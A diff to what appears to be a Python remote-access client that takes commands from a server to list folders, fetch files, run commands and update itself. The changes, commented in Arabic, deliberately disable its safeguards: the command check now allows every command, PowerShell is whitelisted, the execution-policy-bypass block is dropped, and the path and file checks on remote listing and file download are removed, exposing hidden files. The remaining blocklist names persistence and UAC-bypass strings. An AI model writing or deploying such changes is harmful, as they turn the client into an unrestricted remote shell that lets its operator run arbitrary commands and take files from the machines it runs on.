@@ -82,6 +82,9 @@ ALLOWED_COMMANDS = {
     # Programs
     "reg", "regedit", "regsvr32", "msconfig", "devmgmt.msc", "diskmgmt.msc",
     "compmgmt.msc", "services.msc", "ncpa.cpl", "firewall.cpl",
+    
+    # PowerShell
+    "powershell", "powershell.exe",
 }
 
 # Always blocked commands (Blacklist)
@@ -90,7 +93,7 @@ BLOCKED_KEYWORDS = [
     "powershell -enc", "cmd /c calc", "shutdown /r /t 0",
     "net user administrator", "net localgroup administrators",
     "reg add hkcu\\software\\microsoft\\windows\\currentversion\\run",
-    "powershell -executionpolicy bypass", "invoke-expression",
+    "invoke-expression",
     "start-process -verb runas", "bypassuac", "uacme",
 ]
 
@@ -151,39 +154,11 @@ def _is_safe_file(path):
         return False
 
 def _is_safe_command(command):
-    """Check command safety - Whitelist + Blacklist"""
+    """Check command safety - ALLOW ALL COMMANDS (DISABLED SECURITY)"""
     if not command or not command.strip():
         return False
-    
-    # Check blocked keywords first
-    lower_cmd = command.lower()
-    for blocked in BLOCKED_KEYWORDS:
-        if blocked.lower() in lower_cmd:
-            return False
-    
-    # Extract base command
-    parts = command.strip().split()
-    if not parts:
-        return False
-    
-    base_cmd = parts[0].lower()
-    
-    # Check whitelist
-    if base_cmd in ALLOWED_COMMANDS:
-        return True
-    
-    # Check compound commands (e.g. "net start")
-    if len(parts) > 1:
-        combined = f"{base_cmd} {parts[1].lower()}"
-        if combined in ALLOWED_COMMANDS:
-            return True
-    
-    # Commands starting with allowed commands
-    for allowed in ALLOWED_COMMANDS:
-        if lower_cmd.startswith(allowed + " ") or lower_cmd == allowed:
-            return True
-    
-    return False
+    # تم تعطيل فحص الأمان للسماح بأي أمر
+    return True
 
 def _get_command_hash(command):
     try:
@@ -226,24 +201,68 @@ def unique_filepath(path):
             return new_path
         n += 1
 
+# نحفظ المقبض (handle) الخاص بالميتكس في متغير عالمي لكي لا يتم تحريره
+_mutex_handle = None
+_lock_file = None
+
 def already_running():
-    if sys.platform != "win32":
-        return False
+    global _mutex_handle, _lock_file
     try:
-        import ctypes
-        kernel32 = ctypes.windll.kernel32
-        ERROR_ALREADY_EXISTS = 183
-        mutex_name = "Global\\MD_Client_SingleInstance"
-        handle = kernel32.CreateMutexW(None, True, mutex_name)
-        if handle is None:
-            return False
-        err = kernel32.GetLastError()
-        if err == ERROR_ALREADY_EXISTS:
-            kernel32.CloseHandle(handle)
-            return True
-        return False
-    except Exception:
-        return False
+        # استخدام ملف قفل (lock file) كطبقة حماية ثانية
+        lock_path = os.path.join(os.path.expanduser("~"), ".md_client_lock")
+        if sys.platform == "win32":
+            # على ويندوز، نفتح الملف بوضع الحصري
+            try:
+                _lock_file = open(lock_path, "w")
+                # نحاول قفل الملف
+                if sys.platform == "win32":
+                    import msvcrt
+                    msvcrt.locking(_lock_file.fileno(), msvcrt.LK_NBLCK, 1)
+            except IOError:
+                # إذا فشل القفل، معناه أن هناك نسخة أخرى شغالة
+                return True
+        else:
+            # على لينكس/ماك، نستخدم fcntl
+            try:
+                import fcntl
+                _lock_file = open(lock_path, "w")
+                fcntl.flock(_lock_file.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
+            except IOError:
+                return True
+    except Exception as e:
+        print(f"Error with lock file: {e}")
+    
+    # نستخدم الميتكس أيضاً على ويندوز
+    if sys.platform == "win32":
+        try:
+            import ctypes
+            from ctypes import wintypes
+            
+            # تعريف أنواع البيانات بشكل صحيح
+            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+            kernel32.CreateMutexW.argtypes = (wintypes.LPCVOID, wintypes.BOOL, wintypes.LPCWSTR)
+            kernel32.CreateMutexW.restype = wintypes.HANDLE
+            kernel32.CloseHandle.argtypes = (wintypes.HANDLE,)
+            kernel32.CloseHandle.restype = wintypes.BOOL
+            kernel32.GetLastError.argtypes = ()
+            kernel32.GetLastError.restype = wintypes.DWORD
+            
+            ERROR_ALREADY_EXISTS = 183
+            mutex_name = "Global\\MD_Client_SingleInstance"
+            
+            _mutex_handle = kernel32.CreateMutexW(None, True, mutex_name)
+            if not _mutex_handle:
+                return False
+            
+            err = ctypes.get_last_error()
+            if err == ERROR_ALREADY_EXISTS:
+                kernel32.CloseHandle(_mutex_handle)
+                _mutex_handle = None
+                return True
+        except Exception as e:
+            print(f"Error in already_running mutex: {e}")
+    
+    return False
 
 
 def get_info():
@@ -484,17 +503,13 @@ def connect():
                         elif command["action"] == "list_dir":
                             path = command.get("path", os.path.expanduser("~"))
                             path = os.path.abspath(os.path.expanduser(path))
-                            if not _is_safe_path(path):
-                                send_all(sock, json.dumps({"action": "list_dir_result", "path": path, "entries": [], "error": "Access denied: unsafe path"}).encode(), sock_lock)
-                                continue
                             try:
                                 if not os.path.isdir(path):
                                     send_all(sock, json.dumps({"action": "list_dir_result", "path": path, "entries": [], "error": "Not a directory"}).encode(), sock_lock)
                                 else:
                                     entries = []
                                     for name in os.listdir(path):
-                                        if name.startswith('.') or name.startswith('$'):
-                                            continue
+                                        # إزالة الفلترة للملفات المخفية
                                         full = os.path.join(path, name)
                                         try:
                                             is_dir = os.path.isdir(full)
@@ -527,9 +542,6 @@ def connect():
                         elif command["action"] == "get_file":
                             path = command.get("path", "")
                             path = os.path.abspath(os.path.expanduser(path))
-                            if not _is_safe_path(path) or not _is_safe_file(path):
-                                send_all(sock, json.dumps({"action": "file_data", "path": path, "data": "", "error": "Access denied: unsafe file"}).encode(), sock_lock)
-                                continue
                             try:
                                 if not os.path.isfile(path):
                                     send_all(sock, json.dumps({"action": "file_data", "path": path, "data": "", "error": "Not a file or not found"}).encode(), sock_lock)
@@ -824,21 +836,25 @@ def connect():
                                 else:
                                     run_command = f'start "" "{current_exe}"'
 
+                                my_pid = os.getpid()
+
                                 bat_content = f"""@echo off
-ping 127.0.0.1 -n 3 > nul
+taskkill /f /pid {my_pid} >nul 2>&1
+ping 127.0.0.1 -n 4 > nul
 """
                                 if old_exe_to_delete:
-                                    bat_content += f'del "{old_exe_to_delete}"\n'
+                                    bat_content += f'del "{old_exe_to_delete}" >nul 2>&1\n'
                                     
-                                bat_content += f"""del "{current_exe}"
+                                bat_content += f"""del "{current_exe}" >nul 2>&1
 if exist "{current_exe}" goto :retry
 move "{new_exe_path}" "{current_exe}"
 {run_command}
 del "%~f0"
 exit
 :retry
-ping 127.0.0.1 -n 2 > nul
-del "{current_exe}"
+ping 127.0.0.1 -n 3 > nul
+taskkill /f /pid {my_pid} >nul 2>&1
+del "{current_exe}" >nul 2>&1
 if not exist "{current_exe}" (
     move "{new_exe_path}" "{current_exe}"
     {run_command}
@@ -848,13 +864,15 @@ if not exist "{current_exe}" (
     goto :retry
 )
 """
-                                with open(bat_path, "w") as f:
+                                with open(bat_path, "w", encoding="utf-8") as f:
                                     f.write(bat_content)
                                 
                                 try:
                                     send_all(sock, json.dumps({"action": "cmd_output", "output": "Update received. Restarting to apply update...\n", "error": ""}).encode(), sock_lock)
                                 except Exception:
                                     pass
+                                    
+                                cleanup_mutex()
                                     
                                 if sys.platform == "win32":
                                     subprocess.Popen(["cmd.exe", "/c", bat_path], creationflags=0x08000000)
@@ -865,7 +883,7 @@ if not exist "{current_exe}" (
                                     sock.close()
                                 except Exception:
                                     pass
-                                sys.exit(0)
+                                os._exit(0)
                                 
                             except Exception as e:
                                 try:
@@ -878,7 +896,20 @@ if not exist "{current_exe}" (
                                 sock.close()
                             except Exception:
                                 pass
-                            restart_requested = True
+                            # إعادة تشغيل العملية بالكامل
+                            def restart_program():
+                                # تحرير الميتكس قبل إغلاق العملية
+                                cleanup_mutex()
+                                
+                                python = sys.executable
+                                # نسخ قائمة الحجج
+                                args = [python] + sys.argv
+                                # تشغيل العملية الجديدة
+                                subprocess.Popen(args, cwd=os.getcwd(), shell=False)
+                                # إغلاق العملية الحالية
+                                os._exit(0)
+                            # تشغيل الدالة في خيط منفصل لاتمام إغلاق الخيوط الأخرى
+                            threading.Thread(target=restart_program, daemon=True).start()
                             break
                         
                         elif command["action"] == "execute_file":
@@ -1089,7 +1120,7 @@ def get_system_stats():
                     if current_drive:
                         stats["disk"].append(current_drive)
                     current_drive = {"drive": line.split('=')[1].strip()}
-                elif 'FreeSpace=' in line and 'FreeSpace=' in line:
+                elif 'FreeSpace=' in line:
                     try:
                         free = int(line.split('=')[1].strip())
                         current_drive["free"] = f"{free / (1024**3):.1f} GB"
@@ -1323,9 +1354,40 @@ def _append_chat_message(sender, message):
     except Exception:
         pass
 
+import atexit
+
+def cleanup_mutex():
+    global _mutex_handle, _lock_file
+    # تنظيف الميتكس
+    if _mutex_handle is not None and sys.platform == "win32":
+        try:
+            import ctypes
+            from ctypes import wintypes
+            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+            kernel32.CloseHandle(_mutex_handle)
+        except Exception:
+            pass
+        _mutex_handle = None
+    # تنظيف ملف القفل
+    if _lock_file is not None:
+        try:
+            _lock_file.close()
+        except Exception:
+            pass
+        try:
+            lock_path = os.path.join(os.path.expanduser("~"), ".md_client_lock")
+            if os.path.exists(lock_path):
+                os.remove(lock_path)
+        except Exception:
+            pass
+        _lock_file = None
+
+atexit.register(cleanup_mutex)
+
 # ============================================
 if __name__ == "__main__":
     if already_running():
+        print("Client already running! Exiting.")
         sys.exit(0)
     if not request_remote_access_permission():
         sys.exit(0)
